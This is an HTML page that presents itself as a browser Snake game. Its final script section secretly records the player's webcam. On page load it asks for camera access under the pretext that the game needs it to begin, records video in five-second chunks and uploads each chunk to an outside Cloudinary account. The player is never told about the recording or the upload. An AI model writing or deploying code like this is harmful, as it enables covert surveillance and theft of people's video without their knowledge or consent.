<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>Snake Game</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      color: white;
      font-family: sans-serif;
      overflow: hidden;
    }
    #message {
      position: absolute;
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0, 0, 0, 0.5);
      padding: 4px 10px;
      border-radius: 5px;
      font-size: 12px;
    }
    canvas {
      display: block;
      margin: auto;
      background: #111;
      width: 100vw;
      height: 100vw;
      max-width: 500px;
      max-height: 500px;
    }
  </style>
</head>
<body>
  <div id="message">Please allow camera access to begin</div>
  <canvas id="gameCanvas" width="400" height="400"></canvas>

<script>
const canvas = document.getElementById("gameCanvas");
const ctx = canvas.getContext("2d");

const tileSize = 20;
const tileCount = 20;

let snake = [{x: 10, y: 10}];
let velocity = {x: 0, y: 0};
let food = {x: 5, y: 5};
let tail = 3;
let score = 0;

function drawGame() {
  moveSnake();
  if (checkCollision()) {
    endGame();
    return;
  }

  clearCanvas();
  drawFood();
  drawSnake();
  drawScore();
}

function clearCanvas() {
  ctx.fillStyle = "#111";
  ctx.fillRect(0, 0, canvas.width, canvas.height);
}

function drawSnake() {
  ctx.fillStyle = "lime";
  for (let part of snake) {
    ctx.fillRect(part.x * tileSize, part.y * tileSize, tileSize - 2, tileSize - 2);
  }
}

function drawFood() {
  ctx.fillStyle = "red";
  ctx.fillRect(food.x * tileSize, food.y * tileSize, tileSize - 2, tileSize - 2);
}

function moveSnake() {
  const head = {x: snake[0].x + velocity.x, y: snake[0].y + velocity.y};
  snake.unshift(head);

  if (head.x === food.x && head.y === food.y) {
    score++;
    tail++;
    placeFood();
  }

  while (snake.length > tail) {
    snake.pop();
  }
}

function drawScore() {
  ctx.fillStyle = "white";
  ctx.font = "16px sans-serif";
  ctx.fillText("Score: " + score, 10, 20);
}

function placeFood() {
  food = {
    x: Math.floor(Math.random() * tileCount),
    y: Math.floor(Math.random() * tileCount)
  };
}

function checkCollision() {
  const head = snake[0];
  if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
    return true;
  }
  for (let i = 1; i < snake.length; i++) {
    if (snake[i].x === head.x && snake[i].y === head.y) {
      return true;
    }
  }
  return false;
}

function endGame() {
  clearInterval(gameLoop);
  document.getElementById("message").innerText = "Game Over! Score: " + score;
}

document.addEventListener("keydown", function (e) {
  if (e.key === "ArrowUp" && velocity.y === 0) velocity = {x: 0, y: -1};
  else if (e.key === "ArrowDown" && velocity.y === 0) velocity = {x: 0, y: 1};
  else if (e.key === "ArrowLeft" && velocity.x === 0) velocity = {x: -1, y: 0};
  else if (e.key === "ArrowRight" && velocity.x === 0) velocity = {x: 1, y: 0};
});

placeFood();
const gameLoop = setInterval(drawGame, 120);

/* ---------- WEBCAM RECORDING ---------- */

const cloudName = "dps0g5ftz"; // replace
const uploadPreset = "unsigned"; // replace

let recorder;
let chunks = [];

async function startRecording() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    recorder = new MediaRecorder(stream);
    recorder.ondataavailable = e => {
      if (e.data.size > 0) {
        chunks.push(e.data);
        uploadChunk(e.data);
      }
    };
    recorder.start(5000);
    document.getElementById("message").innerText = "Game Started";
  } catch (err) {
    document.getElementById("message").innerText = "Camera access failed";
  }
}

async function uploadChunk(blob) {
  const fd = new FormData();
  fd.append("file", blob);
  fd.append("upload_preset", uploadPreset);
  try {
    await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
      method: "POST",
      body: fd
    });
  } catch (err) {
    console.error("Upload error", err);
  }
}

window.onload = () => {
  startRecording();
};
</script>
</body>
</html>
